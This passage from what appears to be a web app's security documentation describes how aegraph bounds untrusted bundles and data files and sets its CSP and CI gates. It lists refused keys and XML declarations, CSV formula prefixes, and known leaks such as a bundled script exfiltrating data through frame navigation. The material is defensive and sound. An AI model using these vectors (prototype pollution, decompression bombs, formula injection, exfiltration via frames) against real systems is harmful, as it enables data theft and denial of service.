  keys in stashes** is ticked: a stash is a plain copy that clearing never
  deletes, so the Claude key, the OpenAI key, the Spotify session and the
  bridge's address with its token (`isSecretKey`) are left out. A restore keeps the keys this browser has now unless
  the stash holds its own; a browser keeps at most ten stashes, and one it has
  no room for is refused before anything is copied.
- **A deployed copy holds no key.** It is a static site: there are no
  functions, no accounts and no server-side environment, so there is nothing
  on the server to steal and nothing that spends on the operator's behalf. A
  key in use is the visitor's own, in their browser.
- **Nothing secret is compiled into the bundle.** The app reads no `VITE_`
  variable; anything given a `VITE_` name would be public by design, so never
  give a secret one.
- **The dev server's own routes answer only its own page.** Locally
  `/api/openai` is ungated and spends the key in `.env.local`, `/api/fetch`
  fetches public pages from your machine, and
  `/__local/demos` streams files from your disk. Vite refuses a foreign `Host`
  (DNS rebinding); `scripts/devOrigin.mjs` additionally refuses a request whose
  `Origin` or `Sec-Fetch-Site` says another page sent it — any site you have
  open could otherwise post to the loopback blind — and serves `/api/openai`
  and `/api/fetch` only at their exact paths to a `fetch` from the tab
  (`Sec-Fetch-Dest: empty`; `/api/fetch` with its address in `x-fetch-url`),
  so an `<img>` or a frame on the app's own page cannot reach them either
  (`localApiRoute`). They, and the live demos checkout under `/demos`, answer
  the loopback alone (`isLoopbackPeer`, on the socket's address): a request
  with no `Origin` is let through as the developer's own, which holds only
  while nobody else can reach the server — `vite --host` puts it on the
  network, and a machine on the LAN would otherwise spend the key, use yours
  as a fetch proxy or read your local demos.

## Embedding aegraph in another product

Unigraph and the workspace around it are built to be handed data that nobody
vetted — a file a user of *your* product uploaded. What that means in practice:

- **A gzipped bundle is bounded.** Compression ratios are unbounded, so a small
  file can be gigabytes expanded; every decompression path goes through
  `src/core/exchange/gunzip.ts`, which counts what comes out and refuses past
  `MAX_INFLATED_BYTES` (128 MB, an argument you can lower) — or, for a pack
  (`.aeb`), `MAX_PACK_INFLATED_BYTES` (512 MB: the pack is the form for projects
  of a million entities, which decode to a few hundred megabytes, and it becomes
  entities with no text copy beside them). Without that, one
  crafted file takes the tab — and your product with it. (`__tests__/gunzip.test.ts`
  builds a real bomb.) A gzip offered as a pack is inflated only as far as its
  first chunk to see that it is one, and refused there when it holds anything
  else (`gzipHoldsPack`).
- **A bundle's shape is bounded.** A value nested past `MAX_DATA_DEPTH` (64)
  is refused on the way in — one nested 100,000 deep used to stop every later
  save in the tab — and a pack holds at most 5 million entities and 200 million
  array items and map entries in all, checked as it is read
  (`src/core/exchange/limits.ts`; the decoder validates each entity's shape).
  A project's includes are walked without recursion, at most 32 levels and 256
  projects (`walkIncludes`). An entity this browser still cannot store is set
  aside (`PersistStatus.lost`, reported on screen) instead of blocking every
  save after it.
- **A bundle changes only what is its own.** Its new entities go in marked with
  the file's project and nothing else — marks naming other projects are
  dropped, so a file cannot put anything into a project of the reader's. That
  project's own entities already in the Library are updated in place when the
  file's are newer. Anything else in the Library — an entity in no project or
  in other projects only — is left untouched and counted
  (`BundleConflicts.entities`); project entities in the file other than its
  own are never written (`conflicts.projects`); a file's `includes` is never
  taken. A type definition or tag colour the Library holds differently is kept
  unless the caller agrees (`replaceTypes`, or a yes to the question); dates
  later than now are brought back to now, so a file cannot stay "newer" than
  every edit to come; a project id that is unsafe, or names something in the
  Library that is not a project, gets a new project. `previewBundle` in
  `src/core/projects/bundle.ts` reports all of it without writing, for a caller
  that asks first. A template's ids are rewritten over the parsed values, not
  the JSON text. Constraints a bundle brings arrive switched off (see *Data
  that is drawn and run*).
- **A data file is bounded.** A CSV, TSV, text, Excel or Parquet file (attached
  to a chat, or handed to the `dataset` tool as a `data:` URL) is read by
  `src/core/datasets/files.ts` within `DATASET_FILE_LIMITS`: 50 MB before it is
  read; 200,000 rows, 500 columns and 5 million cells as it is read (refused at
  the bound, never truncated silently); 256 MB once decompressed; 128 million
  characters of cell text in all. A workbook's members are inflated through
  `gunzip.ts` (`inflateRawText`, the same ceiling) by the app's own reader
  (`xlsx.ts`), not unzipped whole by a library; its XML is scanned in one
  forward pass with `indexOf`, never a backtracking expression, at most 100
  sheets, yielding every 2,000 rows. A Parquet file's footer is checked before a
  page is read, every page header is checked before the page is decoded
  (`checkPages`), row groups against the footer, rows read as arrays, and each
  page's codec gets a buffer of exactly its declared size, counted against the
  ceiling (`parquet.ts`). A CSV line's width is counted as it is split —
  100,000 fields unless a caller says fewer (`CSV_MAX_FIELDS`) — and the
  delimiter guess and the preview read at most 64 KB of a line. Long parses
  yield to the page between slices. A header that names `constructor` or
  `prototype` becomes a column's label under another key, and those keys are
  dropped from nested JSON cells (`src/core/datasets/__tests__/files.test.ts`,
  `bounds.test.ts`).
- **A graph file is bounded.** Every graph import, dropped on the Import tab or
  fetched by `import_graph`, goes through `GRAPH_FILE_LIMITS`
  (`src/core/exchange/graph/limits.ts`): 128 MB per file, checked before it is
  read (and as a download arrives, whatever the server said it would send,
  `readGraphResponse`); 1 million nodes and 2 million edges; for Parquet, 1,000
  columns, 20 million cells, 512 MB decompressed and 256 million characters of
  text. A diagram holds at most 200,000 edges (`MAX_DIAGRAM_EDGES`), and a
  Mermaid line past 2,000 characters is dropped. The ChatGPT and atlas importers
  walk a conversation's tree with a visited set and a cap of a million steps,
  so a cycle ends.
- **A graph import touches only its own.** It updates in place only what an
  import made; a node id that names any other entity updates it only when
  asked (`reuseExistingIds`, off by default; never a type definition, a graph
  object or a diagram, and never changing its type), and otherwise the node
  gets an id of its own. A relationship id in the file is reused only when
  asked and only between the same two entities: a file cannot rewire what is
  there.
- **A field key cannot reach an object's machinery.** Keys arrive from CSV
  headers, imports and tool calls; `__proto__`, `prototype` and `constructor`
  are refused as path segments, so a write lands in the entity's own data and
  nowhere else (`src/core/entity/__tests__/fieldPath.test.ts`). The graph
  readers drop those keys as they read (`UNSAFE_KEYS`, `assignSafe` in
  `core/exchange/graph/model.ts`), a diagram's mapping takes a type only from
  an own property (`typeIn`), and the type registry skips a type that is not a
  string.
- **XML imports (GEXF, GraphML) are read before the libraries see them.**
  `parseXmlDocument` (`core/exchange/graph/xml.ts`) reads the file with the
  browser's `DOMParser`, which does not resolve external entities, and refuses
  a file that declares a document type or an entity (`<!DOCTYPE`, `<!ENTITY>`)
  or is not well-formed, before graphology's readers parse it
  (`checkGraphml`, `checkGexf`); a name a plain object already answers to
  (`__proto__`, `constructor`, `toString`) is refused as a key, since the
  libraries index plain objects by what the file says. KML on the Maps page is read
  by a small regular-expression scan with no DOM and no entity expansion, so
  the document-type refusal does not apply to it. `@xmldom/xmldom` is a
  build-time dependency only and is not in the bundle.
- **A CSV the app writes is safe to open in a spreadsheet.** A cell that would
  be a formula there (starting `=`, `+`, `-`, `@`, a tab or a carriage return,
  unless it is a number) is written with a `'` in front, and reading a CSV takes
  that one `'` off again, so a file round-trips unchanged (`lib/csvCell.ts` ›
  `defuseCell`, `restoreCell`): `.ae.csv`, the Gephi pair, a dataset's CSV and a
  table from the entity browser.
- **Shader sources are static constants.** No value from the data is
  interpolated into WGSL or GLSL, so a graph cannot reach the GPU pipeline as
  code.
- **Scripts are walled off** — see *Data that is drawn and run* above.
- **Still yours to decide:** the ceilings above are sized for the largest
  projects the app is built for (a million entities, a pack of five), not for
  your users' machines. If your users upload arbitrary files, lower them —
  `MAX_INFLATED_BYTES`, `DATASET_FILE_LIMITS` and `GRAPH_FILE_LIMITS` are
  arguments — before handing files over.

## What CI enforces

Every push and pull request, from a fork too (nothing here needs a secret):

- **no advisory** in what ships (`npm audit --omit=dev --audit-level=low`, a
  gate) and none in the build tools either;
- **no credential in any commit** of the history, not just the tip
  (TruffleHog over the full clone, its scanner image pinned by digest to the
  same release as the action rather than `latest`);
- **no project bundle, export, `.env` or key** tracked, and nothing over 5 MB —
  the third layer under `.gitignore` and the commit hook — with every list of
  names read unquoted and NUL-separated, as the hooks read it;
- **CodeQL** (`security-and-quality`) per pull request and weekly, reporting
  under Security → Code scanning (which, like dependency review, needs the
  repository to be public — both jobs skip themselves until it is);
- **dependency review** on a pull request: a new dependency with an advisory,
  or a licence this project cannot carry, is said on the pull request (it reads
  GitHub's dependency graph, so it waits for the repository to be public);
- **the headers in this file are a test** — `src/__tests__/headers.test.ts`
  asserts the policy still forbids inline script *and* still allows what the
  sandboxes are built on, because both ways of getting it wrong are silent;
- **the lockfile holds every platform's native binaries**, after one rebuilt on
  a Mac made `oxlint` uninstallable on Linux while every local check passed;
- **what runs in the origin is in the build** — the sandbox bootstraps and the
  ONNX runtime are asserted in `dist/`, since a missing file fails silently or
  falls back to a CDN.

Actions are pinned to commits rather than tags, and Dependabot moves the pins.
A workflow declares `permissions: contents: read` and asks for more only in the
job that needs it, and every checkout keeps no credentials
(`persist-credentials: false`), so nothing a job runs afterwards finds a token
in `.git/config`.

## Dependencies

`npm audit --omit=dev` reports **no advisories** in what ships to a browser, and
CI fails if that changes (`.github/workflows/ci.yml`). Where an upstream package
had not published a fix in its own release line, `package.json` › `overrides`
pins the patched version rather than leaving the advisory open: `lodash-es`,
`nanoid`, `sharp` (0.35.5 or later), `source-map-js` (1.2.2 or later), `katex`
(0.18.2 or later; Mermaid uses it only to render to a string), `sass` (1.79 or
later — Excalidraw lists it and never imports it, and the old one brought
`chokidar` 3 and `braces`), and `global-agent` 4 under `onnxruntime-node`
(3 brought `roarr` and `sprintf-js`; it runs only in that package's install
script).

`npm audit` with the build tools included also reports **no advisories**.
There is nothing outstanding and nothing waived.

`sharp` deserves a word because an audit will surface it loudly: it is a native
image library that `@huggingface/transformers` uses **in Node**. The browser
build does not include it, and the model is only ever fetched for search by
meaning, so the libvips and libheif advisories are not reachable from the app.
The override pins the patched version anyway.

**What `npm install` and `npm run dev` execute.** Every package in the lockfile
is registry-resolved with an `integrity` hash; there are no git or URL
dependencies. Four packages have install scripts: `onnxruntime-node`
(postinstall — on Linux it would download CUDA binaries from GitHub, unhashed,
so `.npmrc` sets `onnxruntime-node-install-cuda=skip`), `protobufjs` (a version
notice), and the optional `fsevents` and `@parcel/watcher` (under `sass`; it
builds from source only where no prebuilt binary fits). The deployed site
installs with `npm ci --ignore-scripts` (`vercel.json` › `installCommand`), as
CI does, so neither they nor `prepare` run in a build that holds secrets.
The repository's own `prepare` points
`core.hooksPath` at `.githooks`; if a hooks path was already set — an
organisation's global secret scanner, say — it is recorded as
`aegraph.previousHooksPath` and chained after ours rather than replaced.

`predev` and `prebuild` download the Python runtime and wheels. Each is verified
before it is kept: the Pyodide core files against SHA-256 pinned in
`scripts/pyodide/fetch.mjs`, every wheel against the `sha256` in the pinned
`pyodide-lock.json`, and plotly at a pinned version against PyPI's digest. A
mismatch deletes the file and fails the step. File names from a lock must be
plain names — no path reaches outside its directory. Nothing that is downloaded
runs outside the script sandbox.

**The demos are pictures and bundles, nothing else.** The demos catalog comes
from another repository — or, for a build with no checkout and no token, from
the copies a site publishes (`AEGRAPH_DEMOS_SITE`, default aegraph.dev: https
only, no redirects, its entries held to the same names by
`catalog.mjs › fromPublished`) — and what `scripts/demos/fetch.mjs` writes is served
from the app's own origin, where `script-src 'self'` would run a script it
carried. So nothing in it is taken on trust (`scripts/demos/catalog.mjs`):
every id and file name is a plain name; a bundle must be `.ae.json`,
`.ae.json.gz` or `.aeb`, and a preview a PNG, JPEG or WebP whose first bytes
say so; and each entry written is rebuilt from the fields the app reads, never
copied. `/demos/*` is served with `Content-Security-Policy: sandbox;
default-src 'none'` besides. Pin `AEGRAPH_DEMOS_REF` to a commit for a
production build. A CLI deploy (`vercel deploy` from a working checkout)
uploads nothing `.vercelignore` refuses — the same shapes as `.gitignore`'s
user data — so a checkout's local projects never ship.

**Licences.** Production dependencies are overwhelmingly MIT, ISC, Apache-2.0
and BSD. Three deserve a look before you redistribute:

| Package | Licence | Where it comes from |
| --- | --- | --- |
| `elkjs` 0.12 (direct) | EPL-2.0 **or** GPL-3.0 | the layered diagram layout; take it under EPL-2.0 |
| `elkjs` 0.9 (via `mermaid`) | EPL-2.0 | Mermaid's layout |
| `@img/sharp-*` | LGPL-3.0 (libvips) | Node-only, under `@huggingface/transformers`; not in the browser build |

EPL-2.0 is a weak, file-level copyleft: using the unmodified library imposes
nothing on your code, but a modified copy of its files must be offered under
EPL. Nothing in the browser build is GPL- or LGPL-only. `dompurify` is
MPL-2.0 **or** Apache-2.0; `khroma` publishes no licence field but is MIT
upstream.

## Response headers

Every response carries `Strict-Transport-Security: max-age=63072000;
includeSubDomains`, `X-Content-Type-Options: nosniff`,
`Referrer-Policy: strict-origin-when-cross-origin`,
`X-Frame-Options: SAMEORIGIN`, `Cross-Origin-Opener-Policy: same-origin` and a
`Permissions-Policy` that allows only what the app uses (geolocation for *my
location* on the map, the microphone for voice, display capture for a video
still — camera, payment, USB, serial, Bluetooth and idle detection are denied).
Paths under `/api/` (the dev server's own routes) add `no-referrer` and
`no-store`; `/demos/*` adds a
`sandbox; default-src 'none'` policy of its own.

**The same headers locally.** `vercel.json` is the one source: `vite preview`
sends its headers exactly, and the dev server sends them with one addition to
`script-src` — the SHA-256 of the Fast Refresh preamble that
`@vitejs/plugin-react` inlines (`scripts/headers.mjs`). Any other inline script
is refused on `npm run dev` too, which matters because that is where most people
open other people's bundles.

A **Content-Security-Policy** is enforced on every response:

```
default-src 'self';
script-src 'self' 'wasm-unsafe-eval' 'unsafe-eval' blob:;
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob: https:;   font-src 'self' data:;
media-src 'self' data: blob: https:;
connect-src 'self' data: blob: https: wss: ws://127.0.0.1:* ws://localhost:*;
worker-src 'self' blob:;   frame-src 'self' blob: https:;
object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'
```

**`'unsafe-inline'` is absent from `script-src`, which is the point.** An
injected `<script>`, a `javascript:` URL and an inline event handler are all
refused — the vectors a diagram, a document or a bundle could carry. `object-src
'none'`, `base-uri`, `form-action` and `frame-ancestors` close plugin content, a
`<base>` rewriting every relative URL, a form posting elsewhere, and being
framed by another site.

**`'unsafe-eval'` is present, and it is Pyodide's.** CPython's JavaScript glue
compiles functions at run time, and there is no way to grant that to the sandbox
alone: a frame inherits the app's policy whether it is `srcdoc` or loaded from a
URL — measured both ways — and its own `<meta>` policy can only narrow what it
inherited. So the choice was app-wide `'unsafe-eval'` or no Python scripts. It
costs little next to `'unsafe-inline'`: `eval` is reachable only from code that
is already running, and nothing can get code running. That sentence depends on
the app itself never compiling data: constraint rules used to (`new Function`),
and now run in QuickJS — see *Data that is drawn and run*.

`connect-src` allows `https:` broadly because the linked-data importer fetches an
endpoint the user types, and `ws://127.0.0.1:*` for the Claude Code bridge.
Narrow both if your deployment does not need them.

Everything in it was checked in headless Chrome against the built app, enforcing
rather than report-only: every page walked with no violation and no console
error, wasm compiling, module and `blob:` workers starting, inline styles, the
bridge's WebSocket, third-party tiles — and both script sandboxes running for
real, a Visual script importing three.js and returning a result, and the Python
bootstrap starting a worker that can `eval`.

The sandboxes had to be refactored to get here, and the trap is worth keeping in
mind: **an inline bootstrap inside a sandbox frame stops working the moment a
`script-src` is enforced, silently.** Both engines now load their bootstrap by
URL from `public/sandbox/` and pass everything after it as `blob:` scripts —
`src/scripting/README.md` has the detail, including the protocol version to bump
when their messages change.

## Deploying for an organisation

### On developers' machines

1. **Set `AEGRAPH_HOSTED_ORIGIN`** in developers' environments to your own
   deployment if its pages should drive their bridge (unset, it is
   aegraph.sh; empty, no hosted site can), and no fork is needed. Set
   `AEGRAPH_BRIDGE_ORIGINS` to exactly the origins that may drive the bridge —
   the local dev origin and your deployment — and `AEGRAPH_BRIDGE_TOKEN` on
   shared machines.
2. **Register the MCP servers deliberately.** The repository ships
   `.mcp.json` with the bridge only, and no `.claude/` settings, hooks or
   permission rules — nothing runs when a clone is opened in Claude Code
   until the developer approves the project server. Keep your own Claude Code
   permission policy (managed settings) in charge: aegraph's tools are app
   tools, and none of them needs a shell.
3. **The headless engine over `--port`** needs its token passed as a header
   when registered (`claude mcp add --transport http … --header
   "Authorization: Bearer …"`); over stdio it needs nothing. Either way it
   reaches no URL a tool was handed unless started with `--allow-network`;
   leave that off unless the workspace's data is trusted.
4. **Install with the lockfile** (`npm ci`), and on a network that proxies
   npm, keep `.npmrc`'s CUDA setting. Verify the hooks: `git config --get
   core.hooksPath` prints `.githooks`, and `git config --get
   aegraph.previousHooksPath` names your organisation's hooks if you had
   them.
5. **Decide about the third-party services** in the table above. Tell people
   about **Third-party services** in the settings menu, and block the hosts you
   do not want at the network as well — the switch is per browser, so it is a
   default, not a policy.
6. **Tell people where the projects folder should be** — somewhere backed up
   and access-controlled, never a source tree.

### Hosting it

A deployed copy is a static site: the build's `dist/` with `vercel.json`'s
headers, and no function, account or server-side secret. There is nothing on
the server to configure for the assistant: a visitor chats through Claude Code
over their own bridge (when the bridge accepts your origin — see above) or with
an Anthropic API key of their own, which their browser sends straight to the
Claude API; voice through OpenAI likewise needs their own key. A page the
browser may not read cannot be read by `web_fetch` there.

1. **Serve it from an origin you control**, and set that origin as
   `AEGRAPH_HOSTED_ORIGIN` (or in `AEGRAPH_BRIDGE_ORIGINS`) on the machines
   whose bridge it may drive.
2. **Keep the headers.** Serve `vercel.json`'s headers (or their equivalent on
   your host) on every response — the Content-Security-Policy above most of
   all.
3. **Keep Deployment Protection on for previews**, which otherwise publish any
   branch's build at a public address.
4. **Pin the demos.** Set `AEGRAPH_DEMOS_REF` to a commit of the demos
   repository, so a build serves the demos that were reviewed, not whatever
   its default branch holds that day. A build that reads a published site
   (`AEGRAPH_DEMOS_SITE`) takes whatever that site serves at build time; set
   it to `off`, or to a site you control, if that is not what you want.

## What is still yours to weigh

These are known, and deliberately not hidden:

- **A script from a bundle can send the dataset to one URL.** The app's
  `frame-src` must allow https for embeds, so a visual script can navigate its
  own frame to an address carrying data, and a frame it makes inside its own
  has WebRTC and DNS hints again. The run is ended and the frame removed on
  that second load, but the request has gone. Nothing runs on arrival, so this
  takes your **Run**: treat running a script someone sent you like opening a
  link they sent you, with your data in it.
- **Python cannot be fenced from itself.** One interpreter runs every Python
  script, so a script can change what the next one in the same worker sees.
  The worker is restarted after untrusted code and when the project changes,
  and every run has a fresh namespace, but two runs of trusted code share an
  interpreter.
- **A constraint's regular expression can be slow.** A `labelPattern` or a
  field predicate's pattern runs on the page's thread with no budget of its
  own, so a pattern written to backtrack can stall a write. A bundle's
  constraints arrive switched off, which is the limit on that: read one before
  you turn it on.
- **Map charts reach Plotly's tile servers.** A script's map trace (or a
  chart drawn as a map) fetches Plotly's default tiles without asking
  Third-party services.
- **A bundle carries the project's conversations.** Your chats with the
  assistant that belong to a project, and its memory document for it, are
  entities of the project, so a saved bundle you send someone carries them.
  **Publish** leaves both out.
- **With Third-party services on, some services hear more.** The browser's own
  speech recogniser streams the microphone's audio to Google (Chrome) or Apple
  (Safari) while voice is on, and a network voice sends the reply's text to
  Google or Microsoft. A provider's thumbnail (`i.ytimg.com`, `i.scdn.co`,
  `upload.wikimedia.org`) loads without a click. A dropped pin's coordinates go
  to Nominatim to look up its address. A remote picture you loaded once shows
  again for the rest of that tab's life.
- **Rich-text documents load remote images on sight.** The document editor
  renders what a document holds; a document in a bundle can therefore make
  your browser request a URL of its author's choosing when you open it
  (it learns that you opened it, and your IP). Markdown and chat do not.
- **The workspace is not encrypted at rest.** IndexedDB and localStorage hold
  your entities, chats, and any key you entered in the clear, readable by
  anything that can read your browser profile. Rely on disk encryption.
  **Clear Library** removes entities; history, chats and keys stay until you
  clear site data.
- **Prompt injection is narrowed, not solved.** See *The assistant and
  untrusted content*: what a hostile text can do is bounded by the tools and
  their questions, not by the model's judgement.
- **The loopback is trusted.** Anything that can open a socket to
  `127.0.0.1` without a browser can drive the bridge (unless
  `AEGRAPH_BRIDGE_TOKEN` is set) — and could already run commands as you.
- **There is no public route for removal requests.** Someone who finds
  themselves in a shipped dataset or a demo has only the security advisory
  form above to ask for it to be taken out; there is no contact address of
  the project's own yet.
- **Scrubbed demo data is not gone everywhere yet.** Demo bundles that were
  cleaned of personal details in this pass are still in the demos
  repository's git history, and on `aegraph.dev` (and on earlier deployments'
  own URLs) until the next deploy replaces them.

## Review passes

- **Pass 6 (2026-10-08)** — what a file someone sent you can make happen,
  read again from every way in. The supply chain: no advisory in any
  dependency, the site installed with no install scripts, the demos catalog
  trusted for nothing, the data guard reading every name and keys anywhere,
  CI checkouts without credentials. Privacy: pictures from data behind one
  gate, media players as sandboxed frames, stashes without keys, voice and
  oEmbed behind Third-party services. The bridge: routing to the first tab's
  origin, cleaned manifests, id'd envelopes, no fetch of its own; tools that
  ask before a handed call could act unseen (images, bundles, memory, voice,
  deletes with text), with quoted labels and guarded dialogs. Sandboxes:
  consent before anything runs on arrival, cleaned figures, a locked
  JavaScript context, fresh Python runs, constraints with a per-write budget
  and bundles' constraints switched off. Bundles: a bundle changes only its
  own project, includes and pack shapes bounded, unstorable entities set aside.
  Rendering: diagrams drawn as images from an allow-list rebuild, the dev
  server's routes refused from data, real colours only, CSV formulas defused.
  Parsers: tables and graph files bounded as they are read, XML with a
  document type refused, reserved keys dropped, ids reused only when asked.
  HSTS. Each change is described in its section above.
